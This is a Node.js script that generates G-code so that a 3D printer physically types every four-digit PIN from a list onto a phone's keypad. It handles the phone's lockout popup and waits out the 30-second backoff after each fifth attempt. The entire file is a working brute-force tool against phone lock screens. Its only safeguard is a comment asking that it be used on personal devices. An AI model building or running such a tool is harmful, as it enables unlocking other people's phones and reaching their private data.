//only use this for your personal devices please
const fs = require('fs')

var finalFileName = 'bruteforce.gcode'

fs.readFile('./short-pin-lengths-4.txt', 'utf8' , (err, data) => {
  if (err) {
    console.error(err)
    return
  }

  if(fs.existsSync(finalFileName)) {
    fs.unlinkSync(finalFileName);
  }
  var fileWriter = fs.createWriteStream(finalFileName, {
    flags: 'a' // 'a' means appending (old data will be preserved)
  })

  //Y between 1,8cm
  //X betwen 1cm
  const HOME = "G0 X0 Y0 Z0"
  const button_0 = "G0 X18 Y0"
  const button_1 = "G0 X0 Y30"
  const button_2 = "G0 X18 Y30"
  const button_3 = "G0 X36 Y30"
  const button_4 = "G0 X0 Y20"
  const button_5 = "G0 X18 Y20"
  const button_6 = "G0 X36 Y20"
  const button_7 = "G0 X0 Y10"
  const button_8 = "G0 X18 Y10"
  const button_9 = "G0 X36 Y10"
  const button_OK = "G0 X0 Y0"
  const button_POPUP = "G0 X20 Y18"
  const button_BACK = "G0 X36 Y0"
  const PRESS_BUTTON = "G0 Z46"
  const RELEASE_BUTTON = "G0 Z53"

  const writeMove = (move) => {
    fileWriter.write(move)
    fileWriter.write(" F500")
    fileWriter.write("\r\n")
  }

  const pressAndRelease = () => {
    writeMove(PRESS_BUTTON)
    writeMove(RELEASE_BUTTON)
  }

  var counter = 1

  //Header Title
  fileWriter.write(";Bruteforce GCODE leet stuff")
  fileWriter.write("\r\n")

  //Set unit to mm
  fileWriter.write("G21")
  fileWriter.write("\r\n")

  //Move the head on the printer to a place where we have some space for the device
  fileWriter.write("G0 X152 Y165 Z53")
  fileWriter.write("\r\n")

  //Wait for positioning the phone
  fileWriter.write("M1 \"Press knob when phone is positioned over 0 Button\" ")
  fileWriter.write("\r\n")

  //Tell the printer that the current position is now to be treated as X0 Y0 and Z30
  //Keeping a Z height here allows us to press buttons
  fileWriter.write("G92 X0 Y0 Z53")
  fileWriter.write("\r\n")
  
  //All movement commands from here on out are absolute to the above coordinate grid
  fileWriter.write("G90")
  fileWriter.write("\r\n")

  //Read all the possible pins and build the gcode file
  data.split(/\r?\n/).forEach(function(line) {
    fileWriter.write(";PIN Number:" + line)
    fileWriter.write("\r\n")
    for (const number of line) {
      switch(number) {
        case "0":
          writeMove(button_0)
          break;
        case "1":
          writeMove(button_1)
          break;
        case "2":
          writeMove(button_2)
          break;
        case "3":
          writeMove(button_3)
          break;
        case "4":
          writeMove(button_4)
          break;
        case "5":
          writeMove(button_5)
          break;
        case "6":
          writeMove(button_6)
          break;
        case "7":
          writeMove(button_7)
          break;
        case "8":
          writeMove(button_8)
          break; 
        case "9":
          writeMove(button_9)
          break;                                                       
      }
      //press the button
      pressAndRelease()
    }
    //press ok after 4 digits
    writeMove(button_OK)
    pressAndRelease()

    //press the 30sec popup after 5 entries
    if(counter%5 == 0 ) {
      writeMove(button_POPUP)
      pressAndRelease()
      fileWriter.write(";Waiting for Backoff after 5 entries")
      fileWriter.write("\r\n")
      writeMove(button_BACK)
      for (let index = 0; index < 11; index++) {
        writeMove("G4 P2000")
        pressAndRelease()
      }
    }
    counter++
  })
  fileWriter.end()
  console.log("Wrote gcode for " + counter + " codes.")
});
